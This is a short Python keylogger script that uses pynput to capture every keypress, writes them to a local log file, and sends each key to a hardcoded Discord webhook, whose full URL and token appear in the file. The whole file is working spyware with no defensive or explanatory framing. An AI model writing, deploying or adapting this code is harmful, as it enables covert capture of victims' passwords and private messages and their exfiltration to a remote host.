from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging

log_dir = ''

log_send = Webhook('https://discord.com/api/webhooks/999786470543982635/sHWEm5uSfPFg-iTDbm6n6EKsBVD3zaL_MsilOdCSGk0wkM_vsxd-DFa4MNANAFWWr8Ts')

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
	logging.info(str(key))
	print(key)
	log_send.send(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()